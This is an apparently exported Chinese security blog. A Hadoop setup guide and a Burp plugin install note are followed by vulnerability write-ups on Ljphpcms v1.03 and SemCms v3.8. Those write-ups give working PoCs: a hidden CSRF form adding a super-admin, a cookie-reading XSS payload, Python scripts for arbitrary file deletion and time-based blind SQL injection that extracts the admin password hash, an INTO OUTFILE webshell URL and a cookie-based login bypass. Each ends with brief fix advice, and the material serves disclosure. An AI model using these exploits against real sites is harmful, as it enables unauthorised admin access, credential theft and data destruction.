    <content type="text"><![CDATA[0x00 前言Apache Hadoop是一款支持数据密集型分布式应用程序并以Apache 2.0许可协议发布的开源软件框架。它支持在商品硬件构建的大型集群上运行的应用程序。此处仅使用一台虚拟机进行hadoop集群搭建，因此称为伪分布式。 0x01 安装JAVA环境-jdk1.8下载安装包安装包可根据需要从官网下载也可以在centos中使用wget命令下载，如下图提取下载链接12#此链接很有可能失效，如失效请重新提取wget https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk-8u201-linux-x64.tar.gz?AuthParam=1553514841_9cc3afa073df0a90e3fbb39088a2cde9 新建安装目录并解压12sudo mkdir /usr/local/java/sudo tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/java/ 配置环境变量123456789# 打开配置文件vi ~/.bashrc # 添加并保存export JAVA_HOME=/usr/local/java/jdk1.8.0_201 #注意此处jdk目录与你解压目录相同export JRE_HOME=$JAVA_HOME/jreexport CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/libexport PATH=$JAVA_HOME/bin:$PATH # 使环境变量生效source ~/.bashrc 测试是否配置成功然后可通过java -version查看是否配置成功 0x02 下载Hadoop并配置下载从官网下载:http://mirrors.shu.edu.cn/apache/hadoop/common/hadoop-3.2.0/hadoop-3.2.0.tar.gz下载后解压到想要放置的目录即可。 配置环境变量12345678# 打开配置文件vi ~/.bashrc # 添加并保存export HADOOP_HOME=/home/wzb/hadoop-3.2.0 #注意此处hadoop目录与你解压目录相同export PATH=$PATH:$HADOOP_HOME/bin:$HADOOP_HOME/sbin# 使环境变量生效source ~/.bashrc 配置hadoop-env.sh中的$JAVA_HOME1vi hadoop-3.2.0/etc/hadoop/hadoop-env.sh 测试是否配置成功hadoop version 0x03 配置ssh免密登陆因为hadoop集群在进行验证时采用ssh公钥登陆，此处配置伪分布式集群，以本地免密登陆为例。 安装centos默认安装了openssh，如未安装，请先进行安装1yum install openssh-server -y 配置打开openssh主配置文件1sudo vi /etc/ssh/sshd_config 需开启并配置的文件如下，其他根据需要可自由配置12345678Port 22ListenAddress 0.0.0.0ListenAddress ::PermitRootLogin noStrictModes noPubkeyAuthentication yesAuthorizedKeysFile .ssh/authorized_keysPasswordAuthentication yes 配置完成后重启服务以使配置生效1sudo service sshd restart 生成公钥123456ssh-keygen -t rsa -P '' #直接回车生成公钥和私钥cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys #将本机的公钥添加进authorized_keys中，这样允许本机通过ssh的形式免密码登录，如配置其他主机免密登陆，请将其他主机公钥配置到`authorized_keys`sudo chmod 700 ~/.ssh #配置相应权限sudo chmod 600 ~/.ssh/authorized_keys 测试本地免密登陆1ssh localhost 配置成功则无需密码直接登陆成功 如果失败请使用ssh -vvv locoalhost进行debug排查 0x04 配置hadoop伪分布式集群配置hadoop运行核心文件core-site.xml123456&lt;configuration&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://localhost:9000&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 配置HDFS分布式储存的配置hdfs-site.xml123456789101112131415&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;1&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.name.dir&lt;/name&gt; &lt;value&gt;/home/wzb/hdfs-data/name&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.data.dir&lt;/name&gt; &lt;value&gt;/home/wzb/hdfs-data/data&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 数据目录格式化1hdfs namenode -format 出现INFO common.Storage: Storage directory /home/wzb/hdfs-data/name has been successfully formatted.字样时表明格式化目录成功 启动Hadoop1start-all.sh 启动过程中下面进程无错误启动即启动成功。12345Starting namenodesStarting datanodesStarting secondary namenodesStarting resourcemanagerStarting nodemanagers 查看java进程使用命令jps可发现相关进程启动成功 查看端口netstat -ntpl |grep java可与上面进程号比对查看相关进程部署在哪个端口。 访问端口http://127.0.0.1:8088 http://127.0.0.1:9870 注意事项本地搭建伪分布式会面临设备关机重启，请在关机前执行stop-all.sh关闭所有相关进程。 0x05 总结在配置环节可能出现多处未知错误，可通过排查log记录解决。如免密登陆及部署hadoop时可能会出现未知错误。 免密登陆出现的错误可通过ssh -vvv localhost查看debug情况，进行相应错误的处理。 部署hadoop过程中，如有关进程未正常启动可通过hadoop目录下的logs文件查看启动失败的进程log,进行相应处理。]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ljphpcms_v1.03代码审计之csrf&&xss]]></title>
    <url>%2FLjphpcms-v1-03%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bcsrf-xss%2F</url>
    <content type="text"><![CDATA[0x00 前言此次审计为Ljphpcms_v1.03最新版demo:http://demo.8cms.com/ 0x01 CSRF添加超级管理员代码分析后台多处操纵存在可利用的CSRF,这里以添加超级管理为例。在后台/admincp.php?c=admin&amp;a=add处可以添加超级管理员。在添加管理员过程中，进验证了权限，未作其他防御CSRF措施 添加管理员测试通过csrf添加管理员测试之前数据库内容测试之后，成功添加l3oog1e用户 CSRF POC123456789101112131415161718&lt;html&gt;&lt;iframe style="width:0;height:0;border:0; border:none;" name="csrf-frame"&gt;&lt;/iframe&gt;&lt;form name="adduser" action="http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=admin&amp;a=saveadd" method="post" target="csrf-frame"&gt; &lt;input type="submit"&gt; &lt;input type="hidden" name="adminname" value="l3oog1e"&gt; &lt;input type="hidden" name="password" value="123123"&gt; &lt;input type="hidden" name="confirmpassword" value="123123"&gt; &lt;input type="hidden" name="flag" value="1"&gt; &lt;input type="hidden" name="groupid" value="0"&gt; &lt;input type="hidden" name="memo" value="csrf_test"&gt; &lt;/form&gt;&lt;script&gt;document.forms.adduser.submit();&lt;/script&gt;&lt;/html&gt; 0x02 后台存储型xss代码分析问题出现在后台站点设置处http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=setting&amp;a=run在\source\control\admincp\setting.php中，对站点设置提交的内容进行了接收处理。123456789101112131415161718192021222324public function action_savebase() &#123; $this-&gt;checkAuth('savebase'); $args = array(); $args = $this-&gt;_validBase(); $model = parent::model('setting', 'am'); // print_r($args);die; $optionname='site_base'; $lang= parent::$lang; if($lang!='cn')&#123; $optionname=$optionname."_".$_SESSION['lang']; &#125; $tjcode=$args['tjcode']; unset($args['tjcode']); $result = $model-&gt;doSave($optionname, $args,$tjcode); unset($model); if (true === $result) &#123; $this-&gt;log('setting', '站点设置', 1); XHandle::halt('保存成功', $this-&gt;cpfile.'?c=setting', 0); &#125; else &#123; $this-&gt;log('setting', '站点设置', 0); XHandle::halt('保存失败', '', 1); &#125; &#125; 代码中$args = $this-&gt;_validBase();接受到的是全部内容但是在下面，又通过$tjcode=$args[&#39;tjcode&#39;];把tjcode内容单出提取出来了。 然后进入到$result = $model-&gt;doSave($optionname, $args,$tjcode);跟进doSave操作12345678910111213public function doSave($option, $array,$tjcode) &#123; $data = serialize($array); if($option=="site_base" || $option=="site_base_en")&#123; parent::loadLib('option'); XOption::updateOption1($option, $data,$tjcode); &#125; else &#123; parent::loadLib('option'); XOption::updateOption($option, $data); &#125; return true;&#125; 看以看到这里其他内容进行了序列化处理，而tjcode却没进行任何处理，之后便进入XOption::updateOption1($option, $data,$tjcode);执行更新操作。跟进updateOption1,发现tjcode依旧没做任何处理 盗取cookie上面说到的tjcode即为流量统计代码处的内容在流量统计代码处插入xss脚本12poc boogle&lt;/textarea&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 执行更新操作，查看数据库，已被插入xss脚本 当不同用户登陆时 用户boogle管理员 0x03 SSRF、XSS结合后台的XSS，还是有些鸡肋，普通用户可能并不具备修改站点设置的权限。这里结合前面的csrfpoc12345678910111213141516171819202122232425&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action="http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=setting" method="POST"&gt; &lt;input type="hidden" name="a" value="savebase" /&gt; &lt;input type="hidden" name="sitename" value="�&amp;#137;&amp;#175;�&amp;#178;&amp;#190;PHP�&amp;#188;&amp;#129;�&amp;#184;&amp;#154;�&amp;#189;&amp;#145;�&amp;#171;&amp;#153;�&amp;#174;&amp;#161;�&amp;#144;&amp;#134;�&amp;#179;&amp;#187;�&amp;#187;&amp;#159;" /&gt; &lt;input type="hidden" name="siteurl" value="http&amp;#58;&amp;#47;&amp;#47;localhost&amp;#47;ljcms&amp;#47;" /&gt; &lt;input type="hidden" name="icpcode" value="浜&amp;#172;ICP�&amp;#164;&amp;#135;08002262�&amp;#143;&amp;#183;" /&gt; &lt;input type="hidden" name="sitephone" value="010&amp;#45;81991660" /&gt; &lt;input type="hidden" name="siteqq" value="1665976568" /&gt; &lt;input type="hidden" name="siteemail" value="82993936&amp;#64;qq&amp;#46;com" /&gt; &lt;input type="hidden" name="siteaddress" value="�&amp;#140;&amp;#151;浜&amp;#172;�&amp;#184;&amp;#130;�&amp;#184;&amp;#176;�&amp;#143;&amp;#176;�&amp;#140;虹&amp;#167;&amp;#145;�&amp;#138;&amp;#128;�&amp;#155;&amp;#173;�&amp;#175;哄&amp;#190;&amp;#183;�&amp;#184;&amp;#173;�&amp;#191;&amp;#131;4�&amp;#143;&amp;#183;�&amp;#165;&amp;#188;" /&gt; &lt;input type="hidden" name="longitude" value="116&amp;#46;304724" /&gt; &lt;input type="hidden" name="latitude" value="39&amp;#46;835519" /&gt; &lt;input type="hidden" name="tjcode" value="boogle&lt;/textarea&gt;&lt;script&gt;alert('boogle')&lt;/script&gt;" /&gt; &lt;input type="hidden" name="qrcode" value="http&amp;#58;&amp;#47;&amp;#47;pic49&amp;#46;nipic&amp;#46;com&amp;#47;file&amp;#47;20140926&amp;#47;9422602&amp;#95;102539153000&amp;#95;2&amp;#46;jpg" /&gt; &lt;input type="hidden" name="logo" value="data&amp;#47;attachment&amp;#47;201811&amp;#47;01&amp;#47;0b4affc887ed2b08&amp;#46;png" /&gt; &lt;input type="hidden" name="logowidth" value="232" /&gt; &lt;input type="hidden" name="logoheight" value="60" /&gt; &lt;input type="hidden" name="btn&amp;#95;save" value="�&amp;#155;&amp;#180;�&amp;#150;&amp;#176;�&amp;#191;&amp;#157;�&amp;#173;&amp;#152;" /&gt; &lt;input type="submit" value="Submit request" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 0x04 修复方式增加防御csrf的验证1token、referer、验证码]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[burpsuite安装分块传输插件]]></title>
    <url>%2Fburpsuite%E5%AE%89%E8%A3%85%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[0x01 前言关于分块传输的用处不多解释，感谢c0ny1编写的自动化插件,项目地址：https://github.com/c0ny1/chunked-coding-converter 0x02 mvn package命令打包下载完成后可直接在pom.xml根目录执行mvn package进行打包，成功后生成一个target文件夹，里面有打包好的burpsuite插件。 IDE打包我这里就用的myeclipse。这里简述一下步骤首先通过file-&gt;import导入目标，选择Existing Maven Projects执行下一步，选择下载好的包含pom.xml的上级目录即可然后稍等一会即可在Packahe Explorer视图中看到整个项目然后在pom.xml上右键执行run as-&gt;maven package操作。如果没有maven package操作可以选择maven build，新建一个，填写Goals为package然后等待其打包完成即可，完成后在target目录中机会生成目标.jar文件 然后启动burpsuite，执行插件添加操作，选择刚才打包好的jar文件 安装成功会有提示然后就可以享受这一利器带来的便利了]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[semcms_php_v3.8任意文件刪除]]></title>
    <url>%2Fsemcms-php-v3-8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%AA%E9%99%A4%2F</url>
    <content type="text"><![CDATA[0x00 前言此篇为审计semcms_php_v3.8的第五篇文章 SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网: http://www.sem-cms.com/审计版本为最新php版 v3.8 0x01 任意文件删除首先在后台Include/function.php功能函数文件中，有一个执行文件删除的函数Delfile()123456789101112 //删除指定文件function Delfile($filename)&#123; if(file_exists($filename))&#123; unlink($filename); &#125; $filename=str_replace("prdoucts/", "prdoucts/small/", $filename); if(file_exists($filename))&#123; unlink($filename); &#125; &#125; 全局搜索查看在哪里调用了该函数。发现在SEMCMS_Function.php中有多次调用这里随便跟踪一个，进入到SEMCMS_Function.php第921行1234$query=$db_conn-&gt;query("select * from sc_images WHERE ID in ($area_arr)"); while($row=mysqli_fetch_array($query))&#123; Delfile($row['images_url']); &#125; 可以发现应该是一个图片删除操作，图片目录保存在数据表sc_images中。到数据库中查看可以验证这一点 那么此时便可以看看$area_arr变量是否可控，从而改变sql查询的结果，达到任意文件删除。继续向上跟踪area_arr变量。在该文件开头可以看到定义了area_arr数组，并且是由POST方式传递进来的AID得到的。这里小伙伴们又要开始惊喜了，因为前面的分析分章不只出现这一处问题了,我们知道后台所有页面均包含了contorl.php对GET传来的数据进行了清洗。而这里偏偏却用了POST方式来接收数据，继续跟踪改变量后，发现到拼接进sql语句再到进入文件删除函数过程中未进行其他任何过滤。 SEMCMS_Function.php 919行后台Include/function.php 如上图显示，网站根目录下boogle.php已被成功删除。 0x02 poc12345678910111213141516import requests#[+]Author : boogle#[+]Blog :https://boogle.github.io/delete_file = "'../test.php'"payload = "-1) union select 1,"+delete_file+",3,4,5-- -"burp0_url = "http://127.0.0.1:80/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Images.php?Class=Deleted&amp;CF=Images"burp0_headers = &#123;"Cache-Control": "max-age=0", "Origin": "http://127.0.0.1", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Referer": "http://127.0.0.1/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Images.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"&#125;burp0_data=&#123;"AID[]": payload&#125;requests.post(burp0_url, headers=burp0_headers, data=burp0_data)print "[+]delete Success!" 0x03 修复方法在contorl.php中增加对POST的过滤。1234567if (isset($_POST))&#123;$PostArray=$_POST;&#125;else&#123;$PostArray='';&#125; //post foreach ($PostArray as $value)&#123; //post verify_str($value); &#125;]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[semcms_php_v3.8 后台注入getshell]]></title>
    <url>%2Fsemcms-php-v3-8-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5getshell%2F</url>
    <content type="text"><![CDATA[0x00 前言此篇为审计semcms_php_v3.8的第四篇文章 SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:http://www.sem-cms.com/审计版本为最新php版 v3.8 0x01 后台sql注入绕过过滤函数写文件前面三篇审计文章中，注入过程中均受到了inject_check_sql()过滤函数的影响，导致select`outfile`等无法使用。而且通过前面的审计，我们已有两种方法进入后台，此次继续向后台进发。123function inject_check_sql($sql_str) &#123; return preg_match('/select|insert|=|%|&lt;|between|update|\'|\*|union|into|load_file|outfile/i',$sql_str);&#125; 本次后台的注入点将绕过该过滤函数，执行更多的操作，运气好的话，更会直接getshell。下面开始审计过程漏洞触发点在后台SEMCMS_Products.php在18行这里接受searchml竟然使用了REQUEST方式，因为前面都包含了control.php，在该函数中均GET得到的数据进行了清洗123456789// 防sql入注if (isset($_GET))&#123;$GetArray=$_GET;&#125;else&#123;$GetArray='';&#125; //get foreach ($GetArray as $value)&#123; //get verify_str($value); &#125; 而此次使用了REQUEST来获取数据，如入无人之地，继续跟踪该变量CatID的走向还是在该文件的132，可以看到CatID变量进入了prolmid函数1234567891011121314151617181920212223if ($CatID!="" &amp;&amp; $Searchp!="")&#123; $flID=prolmid($CatID,$db_conn); $sql=$db_conn-&gt;query("select * from sc_products where languageID=".$_GET["lgid"]." and products_name like '%".$Searchp."%' and $flID"); &#125;elseif($CatID!="" &amp;&amp; $Searchp=="")&#123; $flID=prolmid($CatID,$db_conn); $sql=$db_conn-&gt;query("select * from sc_products where languageID=".$_GET["lgid"]." and $flID"); &#125;elseif($CatID=="" &amp;&amp; $Searchp!="")&#123; $sql=$db_conn-&gt;query("select * from sc_products where languageID=".$_GET["lgid"]." and products_name like '%".$Searchp."%'"); &#125;elseif($indextjs==1)&#123; $sql=$db_conn-&gt;query("select * from sc_products where languageID=".$_GET["lgid"]." and products_index=1 "); &#125;else&#123; $sql=$db_conn-&gt;query("select * from sc_products where languageID=".$_GET["lgid"].""); &#125; 跟进prolmid123456789101112131415function prolmid($ID,$db_conn)&#123; $str=""; $strs=""; $query=$db_conn-&gt;query("select ID from sc_categories where LOCATE(',".$ID.",', category_path)&gt;0 and category_open=1"); while($row=mysqli_fetch_array($query))&#123; $str.= "LOCATE(',".$row['ID'].",', products_category)&gt;0 or "; &#125; $strs ="(".rtrim($str,"or ").")"; return $strs;&#125; 可以看到未经任何过滤直接拼接带入了sql语句。 0x02 poc直接构造一个写webshell的payload1http://127.0.0.1/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Products.php?searchml=1%27,%20category_path)%3E0%20and%20category_open=1%20union%20select%20%22%3C?php%20phpinfo();?%3E%22%20into%20outfile%20%22F:\\phpstudy\\PHPTutorial\\WWW\\semcms_php_v3.8\\boogle.php%22--%20- 访问http://127.0.0.1/semcms_php_v3.8/boogle.php,看到写入成功 0x03 修复方法将REQUEST改为GET]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[semcms_php_v3.8 时间盲注]]></title>
    <url>%2Fsemcms-php-v3-8-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[0x00 前言此篇为审计semcms_php_v3.8的第三篇文章 SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:http://www.sem-cms.com/审计版本为最新php版 v3.8 0x01 web_check.php时间盲注得后台账号密码首先查看后台登陆页面,忘记密码处后台index.html代码1234567891011121314151617181920212223242526272829303132&lt;ul&gt;&lt;li style="text-align:right; margin-right:10px; float:right;"&gt;&lt;a href="javascript:views();"&gt;如果忘记账号与密码,试试找回?&lt;/a&gt;&lt;input type="image" style="width:70px; height:28px; border:0px;" src="SC_Page_Config/Image/SEMCMS_Longin.jpg" /&gt;&lt;/li&gt;&lt;/ul&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;function views()&#123;TINY.box.show('SEMCMS_Remail.php?type=find',1,500,130,1)&#125;if (Request("type")=="ok")&#123; var umail=Request("umail") ; TINY.box.show('SEMCMS_Remail.php?type=ok&amp;umail='+umail,1,500,230,1) &#125;function Request(strName)&#123;thisURL = decodeURIComponent(document.URL);strwrite = thisURL//document.write(strwrite);var strHref =strwrite;var intPos = strHref.indexOf("?");var strRight = strHref.substr(intPos + 1);var arrTmp = strRight.split("&amp;");for(var i = 0; i &lt; arrTmp.length; i++)&#123;var arrTemp = arrTmp[i ].split("=");if(arrTemp[0].toUpperCase() == strName.toUpperCase()) return arrTemp[1];&#125;return "";&#125;&lt;/script&gt; 可以当点击忘记密码时，会调用js的views()函数，而该，函数请求了SEMCMS_Remail.php。跟进SEMCMS_Remail.php查看,发现又调用了../Include/web_check.php1234567&lt;form name="form" action="../Include/web_check.php?type=fintpassword" method="post"&gt;&lt;table width="500" cellpadding="0" cellspacing="0" class="table"&gt;&lt;tr&gt;&lt;td colspan="2" align="right" class="tdsbg"&gt;&lt;span style=" float:left;"&gt;&lt;b&gt;找回账号密码!&lt;/b&gt;&lt;/span&gt;&lt;a href="javascript:TINY.box.hide()"&gt;&lt;img src="SC_Page_Config/Image/icons/hr.gif" border="0" /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="20%" align="right" valign="middle"&gt;输入E-mail:&lt;/td&gt;&lt;td align="left" valign="middle"&gt;&lt;input name="Email" type="text" id="Email" size="50" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align="right" valign="middle"&gt; &lt;/td&gt;&lt;td align="center" valign="middle"&gt;&lt;input type="hidden" name="furl" id="furl" value="&lt;?php echo $url = "http://".$_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF']; ?&gt;" &gt; &lt;input type="submit" name="button" id="button" value="确认找回!" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; &lt;/form&gt; 再次跟进../Include/web_check.php发现可以通过直接访问该页面，传入相应的操作进行请求,而无需从后台登陆处忘记密码进入。当GET传入的type为findok时，进入如下分支1234567891011121314151617181920212223elseif ($Type=="findok")&#123; // 密码找回 $umail=test_input(verify_str($_POST['Email'])); $umm=test_input(verify_str($_POST['umima'])); $urzm=test_input(verify_str($_POST['uyzm'])); $fhurl=str_replace("SEMCMS_Remail.php","",$_POST['furl']); if(empty($umail) || empty($umm) || empty($urzm))&#123; echo'&lt;script language="javascript"&gt;alert("请输入密码与认证码！");history.go(-1);&lt;/script&gt;'; &#125;else&#123; $query=$db_conn-&gt;query("select * from sc_user where user_email='".$umail."' and user_rzm='".$urzm."'"); if (mysqli_num_rows($query)&gt;0)&#123; $db_conn-&gt;query("UPDATE sc_user SET user_ps=md5($umm) WHERE user_email='".$umail."' and user_rzm='$urzm'"); echo'&lt;script language="javascript"&gt;alert("操作成功返回登陆！");location.href="'.$fhurl.'";&lt;/script&gt;'; &#125;else&#123; echo'&lt;script language="javascript"&gt;alert("邮箱或者验证码错误");location.href="'.$fhurl.'";&lt;/script&gt;'; &#125; &#125; &#125; 而仔细观察后发现，这里漏洞利用点是前面两篇出现问题的集合，第一篇中讲到可以通过sql盲注获取当前表段的内容，但是由于在那张表中的信息没有很多用处而显得相对鸡肋。而第二篇则是查询两个参数，由于没有对反斜线做过滤，导致前一个参数可以将单引号转义，从而与后面参数单引号闭合导致注入。这里的问题便是两个参数，前者可以将后者闭合，而当前表又是存储了账号密码的sc_user表，是第一篇的鸡肋得到放大。 0x02 poc话不多说，直接放上payload123456789101112131415161718192021import requestsimport timeburp0_url = "http://127.0.0.1:80/semcms_php_v3.8/include/web_check.php?type=findok"burp0_headers = &#123;"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Referer": "http://127.0.0.1/semcms_php_v3.8/include/web_check.php?type=finddo&amp;XDEBUG_SESSION_START=17436", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"&#125;payload = "or if(ascii(substr(user_ps,&#123;0&#125;,1)) like &#123;1&#125;,sleep(3),1)-- -"passwd = ''for i in xrange(1,33): for j in xrange(32,127): burp0_data=&#123;"Email": "1\\\\", "umima": "boogle", "uyzm": payload.format(str(i),str(j))&#125; start_time = time.time() res = requests.post(burp0_url,headers=burp0_headers,data=burp0_data) #print burp0_data if time.time()-start_time &gt; 3: passwd+=chr(j) print "[+]The md5 password is :"+passwd breakprint "[+]Success get the password!" 0x03 修改后台密码1$db_conn-&gt;query("UPDATE sc_user SET user_ps=md5($umm) WHERE user_email='".$umail."' and user_rzm='$urzm'"); 对前面的payload执行结果可以看到，这里由于数据库中对密码采用md5加密，如果密码比较复杂的话，可以就无法查询出明文结果。那么便可以继续查看findok后面的update操作。1$db_conn-&gt;query("UPDATE sc_user SET user_ps=md5($umm) WHERE user_email='".$umail."' and user_rzm='$urzm'"); 在该操作中，如果知道$umail和$urzm的值，便可以对密码进行修改。而这两个值均可以通过前面注入出密码的方法得到，这里不再赘述，诸位可自行继续操作。例如此处得到`$umail=boogle@qq.com$urzm=6666`修改密码payload123//postEmail=boogle@qq.com&amp;umima=boogle_password&amp;urzm=6666 此处成功修改后台管理员密码为123 0x04 修复方法还是可以通过之前的修复方法，对反斜线\增加过滤即可。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[semcms_php_v3.8 cookie注入绕过后台登陆]]></title>
    <url>%2Fsemcms-php-v3-8-cookie%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%2F</url>
    <content type="text"><![CDATA[0x00 前言此篇为审计semcms_php_v3.8的第二篇文章 SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:http://www.sem-cms.com/审计版本为最新php版 v3.8 0x01 cookie注入导致后台登陆绕过首先查看后台主页SEMCMS_Main.php,包含了SEMCMS_Top_include.php,跟进看到checkuser函数，猜测应该时验证是否登陆的。继续跟进checkuser()函数12345678910111213141516171819function checkuser($db_conn)&#123; //判断用户是否登陆 $cookieuseradmin=@verify_str(test_input($_COOKIE["scuseradmin"])); $cookieuserpass=@verify_str(test_input($_COOKIE["scuserpass"])); $query=$db_conn-&gt;query("select * from sc_user where user_admin='$cookieuseradmin' and user_ps='$cookieuserpass'"); if (mysqli_num_rows($query)&gt;0)&#123; $row=mysqli_fetch_assoc($query); return $row['user_qx']; &#125;else&#123; echo "&lt;script language='javascript'&gt;alert('账号密码不正确重新登陆！');top.location.href='index.html';&lt;/script&gt;"; exit; &#125;&#125; 发现用户名和密码均来自cookie，然后带入sql语句查询，要传入的值经过了test_input和verify_str的过滤，跟进查看一下。verify_str的值我们上一篇审计的时候查看过了，过滤几个sql语句虽然过滤了单引号&#39;，但是并没有过滤\,看看是否能通过转义符\将$cookieuseradmin后面的单引号闭合，从而绕过检测。继续查看test_input12345678function test_input($data) &#123; $data = str_replace("%", "percent", $data); $data = trim($data); $data = stripslashes($data); $data = htmlspecialchars($data,ENT_QUOTES); return $data; &#125; 这里需要注意的是stripslashes，因为stripslashes对\作了处理，但是幸运的是两个反斜线\\时会返回一个。 这里便可以构造cookie值1scuseradmin=Admin\\; scuserpass=or 1 like 1 -- -; 那么拼接后的sql语句即为1select * from sc_user where user_admin='Admin\\' and user_ps='or 1 like 1 -- -' 成功绕过登陆 0x02 poc 0x03 修复方法inject_check_sql()函数中增加对反斜线\的过滤]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[semcms_php_v3.8 前台鸡肋sql注入]]></title>
    <url>%2Fsemcms-php-v3-8-%E5%89%8D%E5%8F%B0%E9%B8%A1%E8%82%8Bsql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[0x00 前言SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:http://www.sem-cms.com/审计版本为最新php版 v3.8 0x01 鸡肋sql注入首先查看index.php引入了web_inc.php,跟进查看，发现第一处sql查询可以看到language变量未用引号包裹，但是在此之前使用verify_str()函数对传入的参数进行了处理。跟进发现是过滤函数,对常用sql语句进行了过滤针对过滤函数，可以发现可以对其进行sql盲注。其中 = 可以使用like绕过构造注入语句1http://127.0.0.1/semcms_php_v3.8/?languageIDD=1 and greatest(length(database()),0) like 1 1http://127.0.0.1/semcms_php_v3.8/?languageIDD=1 and greatest(length(database()),0) like 5 可以看到存在明显注入并得到数据库长度但是这里比较鸡肋的是，因为过滤函数过滤了select。导致无法深层次的获取数据库内容，只能获取database(),’user()’,’version()’等信息。 0x03 